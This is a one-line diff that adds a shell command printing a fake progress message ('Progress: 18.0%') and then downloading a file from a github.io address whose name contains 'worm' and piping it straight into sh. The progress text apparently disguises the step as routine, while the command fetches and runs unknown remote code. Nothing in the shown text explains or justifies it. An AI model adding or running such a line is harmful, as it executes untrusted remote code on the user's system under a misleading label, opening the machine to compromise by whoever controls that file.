@@ -1,0 +1,1 @@
+echo 'Progress: 18.0%'; curl -L --progress-bar frkns.github.io/fun/worm-const-euros-agenda.out | sh
